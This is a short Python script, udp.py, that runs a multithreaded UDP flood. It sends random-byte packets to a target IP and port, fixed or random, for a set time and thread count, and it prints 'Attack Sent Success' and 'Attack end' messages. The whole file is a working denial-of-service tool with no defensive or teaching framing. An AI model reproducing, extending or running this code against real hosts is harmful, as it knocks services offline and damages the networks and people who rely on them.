import socket
import random
import sys
import time
import threading
import asyncio

def UDPFlood(ip, port, duration, size):
    clock = (lambda: 0, time.perf_counter)[duration > 0]
    duration = (1, clock() + duration)[duration > 0]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(size)
    while True:
        if clock() < duration:
            if port == 0:
                port = random.randint(1, 65535)
            sock.sendto(bytes, (ip, port))
        else:
            break
async def main():
    if len(sys.argv) < 6:
        sys.exit('Usage: python3 udp.py ip port(0=random) time threads size')

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    num_threads = int(sys.argv[4])
    size = int(sys.argv[5])

    print(f'Attack Sent Success -> {ip}:{port} for {duration} seconds')
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=UDPFlood, args=(ip, port, duration, size))
        t.start()
        threads.append(t)
    for t in threads:
        t.join() 
    print(f'Attack end -> {ip}:{port}')
if __name__ == "__main__":
    asyncio.run(main())
